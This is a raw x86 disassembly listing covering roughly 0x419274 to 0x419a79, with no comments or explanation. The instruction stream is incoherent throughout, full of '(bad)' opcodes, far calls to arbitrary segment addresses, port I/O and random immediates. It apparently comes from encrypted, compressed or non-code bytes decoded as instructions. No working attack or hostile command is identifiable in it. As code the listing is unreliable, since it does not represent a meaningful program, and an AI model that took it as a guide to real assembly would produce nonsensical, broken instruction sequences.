  419274:	add    esp,DWORD PTR [ecx+0x55115d9a]
  41927a:	cwde   
  41927b:	xchg   ebp,eax
  41927c:	shl    BYTE PTR ds:0xbc9808a,1
  419282:	cmc    
  419283:	lea    edi,[edx-0x693e0e7b]
  419289:	(bad)  
  41928a:	call   0x8ca1:0x4be00940
  419291:	outs   dx,BYTE PTR ds:[esi]
  419292:	scas   al,BYTE PTR es:[edi]
  419293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419294:	mov    dh,0x8e
  419296:	add    eax,0xdcdbf8b0
  41929b:	clc    
  41929c:	mov    bl,0xdd
  41929e:	sbb    al,0x34
  4192a0:	rol    DWORD PTR [edi-0x2cbeff40],1
  4192a6:	xchg   esi,eax
  4192a7:	ds retf 0xb90a
  4192ab:	pop    ss
  4192ac:	pop    edi
  4192ad:	cdq    
  4192ae:	sbb    DWORD PTR [ecx-0x32],0xffffffe7
  4192b2:	mov    ch,0xde
  4192b4:	add    cl,ch
  4192b6:	popf   
  4192b7:	in     al,0xbd
  4192b9:	jns    0x419257
  4192bb:	sub    edx,edx
  4192bd:	pop    esp
  4192be:	shl    DWORD PTR [ebx],cl
  4192c0:	mov    ch,0xe3
  4192c2:	and    BYTE PTR [esi+edi*4-0x45cfe5e4],bl
  4192c9:	xchg   edi,eax
  4192ca:	mov    BYTE PTR [ebx],al
  4192cc:	pop    ss
  4192cd:	das    
  4192ce:	call   0x99da:0xd43bc99d
  4192d5:	in     eax,0xfa
  4192d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192d8:	mov    fs,esp
  4192da:	sbb    esi,esi
  4192dc:	mov    al,ds:0xb24580d6
  4192e1:	into   
  4192e2:	mov    edx,0x6dcc22b3
  4192e7:	mov    dl,0x1b
  4192e9:	or     ecx,edi
  4192eb:	xlat   BYTE PTR ds:[ebx]
  4192ec:	in     eax,dx
  4192ed:	lods   al,BYTE PTR ds:[esi]
  4192ee:	jmp    esp
  4192f0:	xchg   DWORD PTR [esi],ebp
  4192f2:	call   0x88d4:0x90c8f932
  4192f9:	into   
  4192fa:	mov    DWORD PTR [edi-0x74cb5c76],esp
  419300:	lds    esp,FWORD PTR [esi-0x2d4dbc9c]
  419306:	push   ebp
  419307:	in     eax,dx
  419308:	mov    edx,0xe8caeefa
  41930d:	or     edx,DWORD PTR [esi]
  41930f:	aam    0xf3
  419311:	inc    esp
  419312:	mov    edx,0x9ab11df5
  419317:	pop    ebp
  419318:	out    dx,eax
  419319:	mov    bl,0x9c
  41931b:	add    eax,0xa0ca72fe
  419320:	push   es
  419321:	lods   eax,DWORD PTR ds:[esi]
  419322:	iret   
  419323:	fld    QWORD PTR [ecx+0x6920b59b]
  419329:	inc    ebp
  41932a:	call   0xf461:0x860b979
  419331:	push   ebp
  419332:	jb     0x4192db
  419334:	adc    eax,0xbdd5d010
  419339:	in     eax,0x2
  41933b:	mov    ecx,0x245f28b2
  419340:	xor    dh,dh
  419342:	mov    dl,0x3c
  419344:	test   DWORD PTR [ebx],0x7f3e59ed
  41934a:	retf   
  41934b:	repz jmp 0xa7012f48
  419351:	push   0xdb5e9b51
  419356:	outs   dx,BYTE PTR ds:[esi]
  419357:	jne    0x4193ad
  419359:	or     BYTE PTR ds:0xd3085dce,bh
  41935f:	mov    ds:0x838d6a5a,al
  419364:	mov    ecx,0x5b32225c
  419369:	mov    edi,DWORD PTR [ecx]
  41936b:	sbb    eax,0xa71bf055
  419370:	cmp    eax,0x24957fdd
  419375:	fmul   st(1),st
  419377:	xlat   BYTE PTR ds:[ebx]
  419378:	mov    ch,0xfe
  41937a:	es test al,0x52
  41937d:	mov    cl,0x99
  41937f:	rcl    edi,1
  419381:	or     edx,esp
  419383:	imul   esi,DWORD PTR [esi+0x2e2a1d23],0x5ccb997a
  41938d:	jg     0x419356
  41938f:	cs sbb edx,esp
  419392:	call   0x26a0:0xb5c71587
  419399:	bound  eax,QWORD PTR [ebp+0x348ba4e3]
  41939f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193a0:	into   
  4193a1:	aaa    
  4193a2:	(bad)  
  4193a3:	pop    eax
  4193a4:	or     DWORD PTR [ecx],0x169f6044
  4193aa:	and    esp,DWORD PTR [edi]
  4193ac:	sbb    al,0x57
  4193ae:	clc    
  4193af:	inc    ebp
  4193b0:	(bad)  [ebx]
  4193b2:	int3   
  4193b3:	fwait
  4193b4:	adc    al,0x6b
  4193b6:	adc    DWORD PTR ds:0xd99a00e3,ebx
  4193bc:	sub    al,0x67
  4193be:	mov    ah,0x69
  4193c0:	mov    eax,ds:0x7ea79b07
  4193c5:	dec    ecx
  4193c6:	outs   dx,DWORD PTR ds:[esi]
  4193c7:	sub    esp,esi
  4193c9:	in     eax,0x9
  4193cb:	fnsave [edx+0x5e6f21e2]
  4193d1:	cmp    eax,0xb4317f4
  4193d6:	out    dx,eax
  4193d7:	xor    DWORD PTR [ecx+0x6605d5ec],ebx
  4193dd:	pop    ecx
  4193de:	call   0xe574:0xdcca9852
  4193e5:	dec    edi
  4193e6:	fnstsw WORD PTR [eax-0x5ae604e7]
  4193ec:	jle    0x4193d7
  4193ee:	(bad)  
  4193ef:	out    dx,al
  4193f0:	in     eax,0x4b
  4193f2:	lods   eax,DWORD PTR ds:[esi]
  4193f3:	mov    ah,0x40
  4193f5:	jbe    0x4193ae
  4193f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193f8:	xor    dl,BYTE PTR [edi-0x73]
  4193fb:	jne    0x419436
  4193fd:	pop    eax
  4193fe:	aad    0x83
  419400:	inc    eax
  419401:	push   eax
  419402:	mov    WORD PTR [edx+0x109c78c0],ds
  419408:	adc    bh,al
  41940a:	loopne 0x4193c7
  41940c:	es xchg esp,eax
  41940e:	stc    
  41940f:	daa    
  419410:	call   0x483e0dd4
  419415:	repnz cdq 
  419417:	pop    ds
  419418:	dec    edx
  419419:	mov    dl,0x56
  41941b:	sbb    DWORD PTR [ebx+ebx*8],0x6d
  41941f:	xor    BYTE PTR [ebx],al
  419421:	or     ebx,esi
  419423:	or     BYTE PTR [ecx+ecx*4],bh
  419426:	data16 cmp al,0x8b
  419429:	int    0xa6
  41942b:	adc    eax,DWORD PTR [esi+0xb]
  41942e:	retf   0x6375
  419431:	jne    0x419475
  419433:	push   ecx
  419434:	xor    cl,BYTE PTR [esi+ebx*1]
  419437:	push   edx
  419438:	into   
  419439:	inc    edx
  41943a:	imul   esp,DWORD PTR [edi-0x72],0xb22a0b97
  419441:	push   edi
  419442:	or     ch,BYTE PTR [edx+ebx*1-0x6]
  419446:	add    edi,0xffffffdb
  419449:	inc    ebx
  41944a:	push   esp
  41944b:	(bad)  
  41944c:	mov    dl,0xbf
  41944e:	jnp    0x4193dd
  419450:	int3   
  419451:	fisub  WORD PTR [eax-0x20904df8]
  419457:	sub    ch,dl
  419459:	inc    ebp
  41945a:	or     BYTE PTR [ecx],dh
  41945c:	add    BYTE PTR [ebx],cl
  41945e:	into   
  41945f:	adc    BYTE PTR [edx],dh
  419461:	jle    0x41948f
  419463:	inc    esp
  419464:	out    0xa,eax
  419466:	call   0x17a3:0xc3b67c7a
  41946d:	fisubr DWORD PTR [eax-0x59]
  419470:	adc    cl,BYTE PTR [edi+0x20d674e2]
  419476:	inc    esi
  419477:	bswap  eax
  419479:	mov    ebx,DWORD PTR [edx-0x6c1ff9b2]
  41947f:	lea    eax,[ebp-0x7f581557]
  419485:	inc    ebp
  419486:	icebp  
  419487:	mov    ecx,0x5fe43422
  41948c:	mov    dl,0x4d
  41948e:	pusha  
  41948f:	mov    eax,0x1a53798e
  419494:	push   ecx
  419495:	or     ch,BYTE PTR [ebx-0x4a]
  419498:	cmc    
  419499:	out    dx,al
  41949a:	aaa    
  41949b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41949c:	dec    ebx
  41949d:	repz jne 0x41945c
  4194a0:	push   esi
  4194a1:	xchg   ebp,eax
  4194a2:	popf   
  4194a3:	xchg   ebp,eax
  4194a4:	ss dec edx
  4194a6:	inc    esp
  4194a7:	jo     0x4194bb
  4194a9:	imul   ebp,DWORD PTR [eax],0x1dec14
  4194af:	dec    edx
  4194b0:	inc    esi
  4194b1:	or     esp,DWORD PTR [edi-0x4e]
  4194b4:	loop   0x4194af
  4194b6:	je     0x4194b0
  4194b8:	mov    dl,0x29
  4194ba:	add    DWORD PTR [ebp+esi*1+0x4b56d5e0],0xfab3719b
  4194c5:	add    ch,BYTE PTR [edi]
  4194c7:	aas    
  4194c8:	mov    dl,0x6a
  4194ca:	mov    WORD PTR [eax],ss
  4194cc:	pop    edx
  4194cd:	cwde   
  4194ce:	iret   
  4194cf:	jge    0x419483
  4194d1:	and    BYTE PTR [esi-0x565117a4],0x60
  4194d8:	adc    cl,BYTE PTR [ebx]
  4194da:	xor    edx,DWORD PTR [edi]
  4194dc:	xchg   DWORD PTR [esi],edx
  4194de:	pop    esi
  4194df:	dec    esi
  4194e0:	popa   
  4194e1:	jecxz  0x419483
  4194e3:	(bad)  [edx-0xf]
  4194e6:	xchg   ebp,eax
  4194e7:	in     al,dx
  4194e8:	int3   
  4194e9:	(bad)  
  4194ea:	xlat   BYTE PTR ds:[ebx]
  4194eb:	inc    ebx
  4194ec:	iret   
  4194ed:	mov    cl,0x19
  4194ef:	cmc    
  4194f0:	mov    ss,WORD PTR [ebx+0xb1bf198]
  4194f6:	data16 (bad) 
  4194f9:	add    DWORD PTR [edi-0x65acef06],edx
  4194ff:	push   ecx
  419500:	jecxz  0x41954e
  419502:	clc    
  419503:	xor    al,0xbb
  419505:	jmp    FWORD PTR [ecx]
  419507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419508:	retf   
  419509:	in     eax,dx
  41950a:	das    
  41950b:	mov    cl,ah
  41950d:	xor    BYTE PTR [esi-0x733b4de4],ch
  419513:	repnz push 0x4f
  419516:	loope  0x41950f
  419518:	pop    edi
  419519:	and    eax,0xb844ebc
  41951e:	jne    0x419524
  419520:	mov    BYTE PTR [ecx],bl
  419522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419523:	pusha  
  419524:	xchg   esi,eax
  419525:	pop    esp
  419526:	sbb    BYTE PTR [edi-0x54],cl
  419529:	dec    edi
  41952a:	fisubr DWORD PTR [edx]
  41952c:	push   0xf7e9a9d5
  419531:	or     ebp,DWORD PTR [ebp+0x49]
  419534:	out    0x49,al
  419536:	sti    
  419537:	(bad)  
  419538:	repz out 0xea,eax
  41953b:	call   0x6da48bf2
  419540:	mov    esp,0x8de489de
  419545:	or     esp,DWORD PTR [esi+0x62]
  419548:	sub    DWORD PTR [edx-0x51],ebp
  41954b:	adc    dl,BYTE PTR [ecx+0x24]
  41954e:	call   0x863b:0x3eaa66ea
  419555:	stc    
  419556:	mov    al,0x9e
  419558:	sub    al,0x7
  41955a:	sbb    ch,BYTE PTR [esi-0x77ca362c]
  419560:	and    eax,0x41369a14
  419565:	enter  0x21ff,0x55
  419569:	inc    ebp
  41956a:	sub    ah,BYTE PTR [edi+0x7679b783]
  419570:	inc    edx
  419571:	cmp    al,0xf2
  419573:	jp     0x419527
  419575:	test   DWORD PTR [eax-0x3145ec00],edx
  41957b:	add    eax,0xb4170bb6
  419580:	loope  0x419528
  419582:	jl     0x419518
  419584:	les    ebx,FWORD PTR [edi]
  419586:	call   0xe6a5:0xca9421df
  41958d:	ret    0x3f1b
  419590:	mov    ebp,0xb5970130
  419595:	xchg   ebp,eax
  419596:	pop    ds
  419597:	or     BYTE PTR [esi-0x6e1e9125],dh
  41959d:	out    dx,eax
  41959e:	call   0x4c0e:0x3bc36c4c
  4195a5:	jmp    0x41957e
  4195a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195a8:	push   es
  4195a9:	sbb    edi,eax
  4195ab:	mov    esi,0xca0294a2
  4195b0:	fstp   TBYTE PTR [esi]
  4195b2:	call   0x999a:0xb3cc5c67
  4195b9:	jae    0x419599
  4195bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195bc:	mov    ecx,0xf261e58
  4195c1:	stos   DWORD PTR es:[edi],eax
  4195c2:	dec    ecx
  4195c3:	jb     0x419577
  4195c5:	pusha  
  4195c6:	dec    eax
  4195c7:	mov    DWORD PTR [esi],ebp
  4195c9:	adc    eax,0x7d717613
  4195ce:	jbe    0x419577
  4195d0:	push   eax
  4195d1:	mov    ?,WORD PTR [edi]
  4195d3:	inc    eax
  4195d4:	daa    
  4195d5:	hlt    
  4195d6:	jne    0x4195ea
  4195d8:	mov    ebx,0x9fa261f2
  4195dd:	lea    edx,[edx]
  4195df:	lea    ebx,[eax-0x40facbf5]
  4195e5:	add    al,dl
  4195e7:	frstor [edi-0x3ec5657a]
  4195ed:	gs sbb ebx,eax
  4195f0:	test   eax,0x88a765f9
  4195f5:	mov    edi,0xeb200a22
  4195fa:	sbb    eax,0xd566b261
  4195ff:	jp     0x41966b
  419601:	and    al,0xb8
  419603:	cmp    DWORD PTR [ebx],ebx
  419605:	or     esp,DWORD PTR [edi]
  419607:	sub    al,0xc2
  419609:	leave  
  41960a:	xchg   edi,ecx
  41960c:	xchg   esi,eax
  41960d:	lds    ebx,FWORD PTR [edx+0x35301911]
  419613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419614:	xor    cl,BYTE PTR [esi+eax*2-0x4d812857]
  41961b:	mov    edx,DWORD PTR [edx-0x16]
  41961e:	scas   al,BYTE PTR es:[edi]
  41961f:	dec    ebx
  419620:	add    BYTE PTR [edx-0x66],ch
  419623:	loope  0x41964e
  419625:	adc    ch,BYTE PTR [edx+0x710436c1]
  41962b:	sti    
  41962c:	jl     0x419659
  41962e:	call   0x413b:0x340c2231
  419635:	inc    edi
  419636:	xchg   esp,eax
  419637:	mov    esp,0xe7f720fb
  41963c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41963d:	leave  
  41963e:	dec    edx
  41963f:	aad    0x4f
  419641:	or     ebx,DWORD PTR [edx+eiz*1-0x36]
  419645:	add    eax,0xdd9ea124
  41964a:	call   0x10a:0xa89221e1
  419651:	xchg   ebx,eax
  419652:	dec    edi
  419653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419654:	push   ss
  419655:	mov    bh,0xd1
  419657:	test   eax,0x16c1f0f6
  41965c:	mov    dl,0xed
  41965e:	gs je  0x4196ba
  419661:	jae    0x4196cf
  419663:	or     eax,0xf4880196
  419668:	push   ebp
  419669:	ins    DWORD PTR es:[edi],dx
  41966a:	and    ah,BYTE PTR [edi+0x78d49c98]
  419670:	pop    ebx
  419671:	xor    BYTE PTR [ecx+0x6af419c8],bl
  419677:	push   ss
  419678:	adc    ebp,DWORD PTR [ebx+0x70993e64]
  41967e:	push   cs
  41967f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419681:	outs   dx,DWORD PTR ds:[esi]
  419682:	mov    ecx,0x2cb1c0f8
  419687:	xor    eax,0xbd6e06b2
  41968c:	repnz shl DWORD PTR [esi],0xe4
  419690:	nop
  419691:	or     cl,BYTE PTR [edi]
  419693:	in     eax,dx
  419694:	xor    eax,0xd675f5be
  419699:	jmp    0x41961e
  41969b:	mov    al,0xb2
  41969d:	and    bh,dl
  41969f:	(bad)  
  4196a1:	push   edi
  4196a2:	ret    0x9c5d
  4196a5:	jle    0x419666
  4196a7:	xchg   edi,eax
  4196a8:	std    
  4196a9:	ja     0x4196ff
  4196ab:	dec    esi
  4196ac:	in     al,0xe4
  4196ae:	call   0x7833:0xda68208a
  4196b5:	mov    al,ds:0x6d6fa7b5
  4196ba:	call   0xe7fb9315
  4196bf:	push   es
  4196c0:	jmp    0xf81:0x9ea74909
  4196c7:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196c9:	ins    BYTE PTR es:[edi],dx
  4196ca:	mov    al,0x81
  4196cc:	inc    ebp
  4196cd:	call   0x7f1a:0x40a0a712
  4196d4:	xchg   edi,eax
  4196d5:	sbb    DWORD PTR [ebx+0x1c9892aa],0x43
  4196dc:	test   BYTE PTR [ecx+0x3646b94e],dl
  4196e2:	iret   
  4196e3:	in     eax,dx
  4196e4:	xor    ebx,DWORD PTR [edx+0x52f67e3a]
  4196ea:	cwde   
  4196eb:	ja     0x41974d
  4196ed:	push   esp
  4196ee:	call   0x2df5:0x39a75c1a
  4196f5:	dec    eax
  4196f6:	sbb    al,0xa7
  4196f8:	dec    eax
  4196f9:	popf   
  4196fa:	scas   eax,DWORD PTR es:[edi]
  4196fb:	gs ret 0x96ad
  4196ff:	jmp    0xa4a4cab6
  419704:	or     ah,al
  419706:	sbb    BYTE PTR [eax],al
  419708:	lahf   
  419709:	push   ebx
  41970a:	jnp    0x419775
  41970c:	mov    dl,0xd8
  41970e:	ror    BYTE PTR ds:0xbe51c63f,cl
  419714:	ror    BYTE PTR [ebx-0x7f2ebc66],0x8e
  41971b:	sub    BYTE PTR [esi-0x45],ch
  41971e:	add    al,0xa7
  419720:	add    ah,dh
  419722:	popf   
  419723:	jg     0x41978c
  419725:	ds in  al,dx
  419727:	mov    ?,WORD PTR [ebp-0x29d655f8]
  41972d:	ins    BYTE PTR es:[edi],dx
  41972e:	lods   eax,DWORD PTR ds:[esi]
  41972f:	mov    ebx,0x9ff7a6c2
  419734:	jae    0x4197b5
  419736:	and    eax,0x9a4a399a
  41973b:	xchg   ebx,eax
  41973c:	cmp    eax,0x2b9db2de
  419741:	ret    0xa39a
  419744:	add    DWORD PTR [edx+0x704bdbcd],0x73
  41974b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41974c:	test   BYTE PTR [ebx],dl
  41974e:	ret    
  41974f:	call   0x71b2:0xf112616b
  419756:	(bad)  
  419757:	int3   
  419758:	jae    0x4196dc
  41975a:	mov    ebx,esi
  41975c:	int    0x17
  41975e:	sub    BYTE PTR [eax+eax*2-0x74],ch
  419762:	cmp    BYTE PTR [eax],bh
  419764:	sub    ebx,ebp
  419766:	loope  0x4196f7
  419768:	xchg   ebx,eax
  419769:	inc    esi
  41976a:	jmp    0x32ef532f
  41976f:	jo     0x41979d
  419771:	mov    ecx,DWORD PTR [esp+edi*2-0x58ca3a74]
  419778:	push   ebx
  419779:	jle    0x4197e8
  41977b:	arpl   WORD PTR [edx+eiz*8+0x2dcc48cd],di
  419782:	popf   
  419783:	adc    al,0x2e
  419785:	pop    ds
  419786:	cmp    eax,ecx
  419788:	inc    ebx
  419789:	dec    eax
  41978a:	shl    BYTE PTR [ecx],0x68
  41978d:	imul   edi,DWORD PTR [edi+0x50b56e1],0x2a
  419794:	push   edx
  419795:	push   cs
  419796:	xchg   DWORD PTR [ecx+0x679d3dc7],ebp
  41979c:	mov    ch,0x4
  41979e:	bound  eax,QWORD PTR [eax-0x362e332e]
  4197a4:	out    0xb,eax
  4197a6:	add    DWORD PTR [ebp+0x23],0xfd84e714
  4197ad:	sub    bl,BYTE PTR [edx+0x67ac6938]
  4197b3:	sbb    ah,BYTE PTR [esi-0x6]
  4197b6:	scas   eax,DWORD PTR es:[edi]
  4197b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197b8:	add    eax,0xe2a5d07f
  4197bd:	sbb    al,0xe8
  4197bf:	repnz mov dl,0x28
  4197c2:	out    dx,eax
  4197c3:	pop    esi
  4197c4:	sub    BYTE PTR [ebx-0x27],bh
  4197c7:	mov    ds:0xa7e9797a,eax
  4197cc:	mov    cl,0x9
  4197ce:	icebp  
  4197cf:	out    0xa6,al
  4197d1:	push   edx
  4197d2:	push   edi
  4197d3:	pusha  
  4197d4:	mov    dl,0x5f
  4197d6:	inc    esi
  4197d7:	cdq    
  4197d8:	mov    esp,DWORD PTR [edi+0x770f154c]
  4197de:	iret   
  4197df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197e0:	in     eax,dx
  4197e1:	cmp    ebx,DWORD PTR [eax+0x32fd1548]
  4197e7:	gs mov bh,0xf4
  4197ea:	sbb    al,0xc
  4197ec:	mov    ah,0x82
  4197ee:	pop    edx
  4197ef:	push   0xffffffba
  4197f1:	pop    ebp
  4197f2:	xchg   ebx,eax
  4197f3:	inc    edi
  4197f4:	or     DWORD PTR [ebx],ecx
  4197f6:	mov    dh,BYTE PTR [edx+0x471e7e2e]
  4197fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197fd:	std    
  4197fe:	cdq    
  4197ff:	ret    0x2ebd
  419802:	(bad)  
  419804:	rol    ebx,cl
  419806:	rcr    DWORD PTR ds:0x6d350bc4,1
  41980c:	jmp    0x6efa:0xc8f851d0
  419813:	sub    DWORD PTR [edx-0x34817f3b],esi
  419819:	add    edx,DWORD PTR [edx]
  41981b:	stc    
  41981c:	mov    ebx,0xf6db970b
  419821:	out    dx,eax
  419822:	push   ecx
  419823:	iret   
  419824:	pop    ds
  419825:	and    BYTE PTR [edx-0x6f90bce0],bl
  41982b:	cmp    DWORD PTR [edi-0xb47254e],edx
  419831:	push   cs
  419832:	pushf  
  419833:	data16 add BYTE PTR [ebx],bh
  419836:	imul   esi,DWORD PTR [ecx-0x76862459],0xe69dccb2
  419840:	daa    
  419841:	mov    al,0x44
  419843:	cmp    cl,BYTE PTR [edx-0xaff30db]
  419849:	and    ecx,DWORD PTR [ecx-0x59]
  41984c:	loopne 0x419894
  41984e:	scas   al,BYTE PTR es:[edi]
  41984f:	out    dx,al
  419850:	jmp    0xa34b:0x96df1bd3
  419857:	les    esi,FWORD PTR [ebx+0x7bb6cf2c]
  41985d:	ret    
  41985e:	cli    
  41985f:	mul    BYTE PTR [esi]
  419861:	loope  0x4198e2
  419863:	sbb    ah,BYTE PTR [edx+0x7c]
  419866:	mov    DWORD PTR [eax-0x7f659b56],ecx
  41986c:	in     eax,0x27
  41986e:	inc    ebx
  41986f:	test   eax,0xcb2f0b55
  419874:	xchg   esi,eax
  419875:	sub    BYTE PTR [ebx],0xe0
  419878:	sub    eax,0x89aa9ab2
  41987d:	pop    ecx
  41987e:	rcl    BYTE PTR [ebp-0x583c2588],1
  419884:	iret   
  419885:	inc    esp
  419886:	or     ah,BYTE PTR [eax]
  419888:	ins    DWORD PTR es:[edi],dx
  419889:	xchg   edx,eax
  41988a:	mov    WORD PTR [eax+0x40],gs
  41988d:	xchg   esp,eax
  41988e:	call   0x530b:0x1ea32c83
  419895:	ret    0xbb68
  419898:	xor    ecx,ecx
  41989a:	mov    edx,0xc9b0e226
  41989f:	mov    edi,0x1fd28b8e
  4198a4:	ret    
  4198a5:	ins    BYTE PTR es:[edi],dx
  4198a6:	inc    eax
  4198a7:	or     DWORD PTR [ebx+ecx*1+0x491b3dfb],eax
  4198ae:	xchg   esp,eax
  4198af:	push   0xffffffeb
  4198b1:	cli    
  4198b2:	call   0x3700:0xf4bc3a9c
  4198b9:	or     BYTE PTR [ebx+0x6622fe9c],cl
  4198bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198c0:	ss out dx,al
  4198c2:	pop    eax
  4198c3:	fdivr  DWORD PTR [edx-0x6b159d21]
  4198c9:	mov    ds:0x66b2b3a2,al
  4198ce:	jge    0x4198da
  4198d0:	fcomp  st(5)
  4198d2:	std    
  4198d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198d4:	mov    edi,DWORD PTR [ebx]
  4198d6:	shr    BYTE PTR [ecx+0x5c],1
  4198d9:	fmul   DWORD PTR [esi-0x4b284d8a]
  4198df:	jle    0x4198b1
  4198e1:	sbb    al,0xae
  4198e3:	xchg   DWORD PTR [eax+0xb],edi
  4198e6:	xor    al,0x85
  4198e8:	pop    ds
  4198e9:	mov    esi,0xbb3e2aef
  4198ee:	call   0x55b8:0xb7d71502
  4198f5:	jl     0x41994f
  4198f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198f8:	sbb    esp,DWORD PTR [edi-0xbfced5d]
  4198fe:	dec    esi
  4198ff:	mov    ds:0x37125b2,eax
  419904:	mov    esp,eax
  419906:	cmc    
  419907:	push   esp
  419908:	es jmp 0x496036e3
  41990e:	sbb    dl,BYTE PTR [ecx]
  419910:	mov    ecx,0x18a6f312
  419915:	add    bl,BYTE PTR [edx-0x222640fe]
  41991b:	add    DWORD PTR [eax],edi
  41991d:	iret   
  41991e:	(bad)  
  41991f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419920:	mov    ch,0x35
  419922:	add    DWORD PTR [ecx],esi
  419924:	sub    esp,eax
  419926:	inc    eax
  419927:	int    0xb2
  419929:	add    BYTE PTR [edx+0x6d531e7e],al
  41992f:	int3   
  419930:	cmp    al,0x14
  419932:	in     eax,0xbe
  419934:	xchg   ebx,eax
  419935:	push   esp
  419936:	jmp    0x41995e
  419938:	(bad)  
  419939:	fcom   DWORD PTR [ecx-0x61386126]
  41993f:	adc    eax,0x6723b3b5
  419944:	sub    DWORD PTR [esi-0x56],ebp
  419947:	dec    edi
  419948:	inc    esp
  419949:	repz pop ds
  41994b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41994c:	ret    
  41994d:	hlt    
  41994e:	add    bl,BYTE PTR [eax]
  419950:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419951:	and    DWORD PTR [esi+0x55aab2ee],0x7974d566
  41995b:	test   dl,cl
  41995d:	or     ch,bh
  41995f:	iret   
  419960:	std    
  419961:	inc    ecx
  419962:	scas   al,BYTE PTR es:[edi]
  419963:	stos   DWORD PTR es:[edi],eax
  419964:	fisttp DWORD PTR [ebx+0x7b]
  419967:	scas   al,BYTE PTR es:[edi]
  419968:	test   DWORD PTR [esi-0x154bd777],edx
  41996e:	test   DWORD PTR [edx-0x1db4a98e],ebp
  419974:	ss jl  0x419979
  419977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419978:	push   es
  419979:	shl    DWORD PTR [eax+0x18b80fc5],0x90
  419980:	mov    cl,0xdb
  419982:	push   es
  419983:	imul   edi,DWORD PTR [edx],0xffffff94
  419986:	imul   ecx,DWORD PTR [edi+0x7f],0xffffff9e
  41998a:	loopne 0x4199ab
  41998c:	dec    edi
  41998d:	or     edi,DWORD PTR [esi]
  41998f:	sbb    eax,0xf07bf55f
  419994:	pushf  
  419995:	adc    BYTE PTR [ecx-0x579b4b54],bl
  41999b:	or     BYTE PTR [ebx+ecx*4+0xaf364e8],ch
  4199a2:	ret    0x93ed
  4199a5:	shr    BYTE PTR [ecx],cl
  4199a7:	push   0x1b
  4199a9:	sti    
  4199aa:	stc    
  4199ab:	fbstp  TBYTE PTR [edx+0x26f7dd75]
  4199b1:	xor    eax,0xc550459
  4199b6:	lock test DWORD PTR [ecx],esi
  4199b9:	in     al,0x56
  4199bb:	push   edi
  4199bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199bd:	ins    DWORD PTR es:[edi],dx
  4199be:	pushf  
  4199bf:	scas   eax,DWORD PTR es:[edi]
  4199c0:	dec    ecx
  4199c1:	repz into 
  4199c3:	xchg   edi,eax
  4199c4:	mov    bh,BYTE PTR [ebx+ecx*8+0x27]
  4199c8:	scas   eax,DWORD PTR es:[edi]
  4199c9:	xor    BYTE PTR [ebx+0x3c15f626],cl
  4199cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199d0:	ds jo  0x4199cc
  4199d3:	sbb    al,0xd2
  4199d5:	mov    ecx,0x4cc3ad50
  4199da:	call   0xaa32:0x7f67d724
  4199e1:	sbb    BYTE PTR [edi],bh
  4199e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199e5:	pop    eax
  4199e6:	cs inc ebx
  4199e8:	mov    al,ds:0x546ce480
  4199ed:	aaa    
  4199ee:	call   0x3824:0x3cc01c15
  4199f5:	jg     0x4199e8
  4199f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199f8:	fs push 0xffffff97
  4199fb:	cmp    esp,DWORD PTR [esi-0x8]
  4199fe:	ss pusha 
  419a00:	mov    ?,WORD PTR [edi]
  419a02:	frstor [edi]
  419a04:	fstp   TBYTE PTR [edx-0x55f7ef75]
  419a0a:	dec    eax
  419a0b:	scas   al,BYTE PTR es:[edi]
  419a0c:	inc    ecx
  419a0e:	clc    
  419a0f:	xor    BYTE PTR [edx],0xb4
  419a12:	or     dh,BYTE PTR [esp+esi*8+0x272a4bf]
  419a19:	or     eax,DWORD PTR [edi+ebx*4-0x37]
  419a1d:	(bad)  
  419a1e:	jge    0x419a1e
  419a20:	popa   
  419a21:	or     ebx,DWORD PTR [eax+0x6e3d6b70]
  419a27:	and    al,0x41
  419a29:	mov    esi,0x69f8769a
  419a2e:	cmp    eax,0xc6af9a29
  419a33:	fcomp  DWORD PTR [ecx-0x5da003f5]
  419a39:	test   eax,0xc8e056e4
  419a3e:	call   0x9338:0xeb3ae257
  419a45:	cmp    BYTE PTR [ebp+ebx*2-0x588f0a78],cl
  419a4c:	sbb    ah,BYTE PTR [edx-0x559e6e48]
  419a52:	sub    BYTE PTR [edx+esi*4],dl
  419a55:	pop    edi
  419a56:	ds ds xchg ebx,eax
  419a59:	(bad)  
  419a5b:	sbb    bl,BYTE PTR [edx-0x4036b4f1]
  419a61:	jno    0x419ad7
  419a63:	addr16 int 0x35
  419a66:	idiv   BYTE PTR [edx+eax*2-0x47486567]
  419a6d:	jne    0x419a15
  419a6f:	pop    ebx
  419a70:	fst    QWORD PTR [esi+0x3f]
  419a73:	mov    al,ds:0x1f7edf24
  419a78:	popf   
  419a79:	sub    edi,edx
